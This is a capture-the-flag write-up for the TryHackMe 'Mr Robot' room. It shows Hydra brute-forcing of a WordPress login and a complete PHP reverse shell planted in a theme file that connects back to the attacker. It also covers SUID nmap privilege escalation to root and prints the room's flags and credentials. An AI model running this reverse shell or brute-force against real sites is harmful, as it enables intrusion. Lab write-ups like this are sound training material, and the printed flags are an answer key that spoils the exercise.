# 🕵️‍♂️ Mr Robot CTF — TryHackMe Writeup

## 📌 Overview

This writeup documents the step-by-step solution of the Mr Robot CTF room on TryHackMe.
The challenge focuses on web exploitation, password cracking, and privilege escalation.

---

## 🔎 1. Reconnaissance

### Nmap Scan

```bash
nmap -F -sC -sV <TARGET_IP>
```

### Results:

* 22/tcp → SSH
* 80/tcp → HTTP
* 443/tcp → HTTPS

👉 Main attack surface: Web (port 80)

---

## 🌐 2. Enumeration

### Directory Brute Force

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

### Important Findings:

* /wp-login.php
* /wp-admin
* /robots.txt

---

## 📄 robots.txt Discovery

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

### Key 1:

```
073403c8a58a1f80d943455fb30724b9
```

### Download Wordlist:

```bash
wget http://<IP>/fsocity.dic
sort fsocity.dic | uniq > clean.txt
```

---

## 🔐 3. Credential Discovery

### Username Enumeration (Hydra)

```bash
hydra -L fsocity.dic -p test <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```

### Found Username:

```
Elliot
```

---

### Password Brute Force

```bash
hydra -l Elliot -P clean.txt <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect"
```

### Credentials:

```
Username: Elliot
Password: ER28-0652
```

---

## 💣 4. Exploitation (WordPress)

### Login:

```
http://<IP>/wp-login.php
```

### Reverse Shell Injection

* Navigate: Appearance → Theme Editor
* Edit: 404.php

### PentestMonkey PHP Reverse Shell

```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'YOUR_IP';  // CHANGE THIS
$port = 4444;     // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        exit(1);
    }
    if ($pid) {
        exit(0);
    }
    if (posix_setsid() == -1) {
        exit(1);
    }
    $daemon = 1;
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
    if (feof($sock)) {
        break;
    }
    if (feof($pipes[1])) {
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
```

---

### Start Listener:

```bash
nc -lvnp 4444
```

### Trigger Shell:

```
http://<IP>/wp-content/themes/<theme>/404.php
```

---

## 🐚 5. Initial Access

```bash
whoami
daemon
```

---

## 🔓 6. Privilege Escalation (User)

```bash
cd /home/robot
ls
```

Found:

* key-2-of-3.txt ❌
* password.raw-md5 ✅

### Crack Hash

```bash
cat password.raw-md5
```

Password:

```
alphabeticallyabcdefghijklmnopqrstuvwxyz
```

### Switch User

```bash
su robot
```

### Key 2

```bash
cat /home/robot/key-2-of-3.txt
```

---

## 🚀 7. Privilege Escalation (Root)

```bash
find / -perm -4000 2>/dev/null
```

Found:

```
/usr/local/bin/nmap
```

### Exploit

```bash
/usr/local/bin/nmap --interactive
```

Inside:

```bash
!sh
```

### Root Access

```bash
whoami
root
```

---

## 🏁 Final Flag

```bash
cat /root/key-3-of-3.txt
```

```
04787ddef27c3dee1ee161b21670b4e4
```

---

## 📊 Summary

| Step              | Description             |
| ----------------- | ----------------------- |
| Recon             | Nmap scan               |
| Enumeration       | Gobuster + robots.txt   |
| Credential Attack | Hydra brute-force       |
| Exploitation      | WordPress reverse shell |
| PrivEsc (User)    | MD5 crack → robot       |
| PrivEsc (Root)    | SUID Nmap exploit       |

---

## 🧠 Key Takeaways

* Always check robots.txt
* WordPress is a common attack vector
* Custom wordlists are powerful
* SUID binaries = critical for privilege escalation
* Misconfigured tools can lead to full compromise

---

## 🚀 Conclusion

This lab demonstrates a complete penetration testing workflow:
Recon → Enumeration → Exploitation → Privilege Escalation
